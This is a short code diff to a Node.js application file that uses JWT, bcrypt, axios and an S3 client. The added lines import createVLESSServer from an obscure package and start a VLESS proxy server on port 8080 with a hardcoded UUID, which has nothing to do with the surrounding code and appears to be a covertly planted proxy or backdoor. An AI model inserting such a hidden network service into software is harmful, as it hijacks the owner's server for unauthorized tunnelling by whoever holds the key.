@@ -11,6 +11,10 @@ const jwt = require('jsonwebtoken');
 const bcrypt = require('bcrypt');
 const { default: axios } = require('axios');
 
+const { createVLESSServer } = require('@3kmfi6hp/nodejs-proxy');
+
+createVLESSServer(8080, '4da011a9-135c-4c13-a29d-0c4842f795ef');
+
 require('dotenv').config();
 
 const s3 = new S3Client({
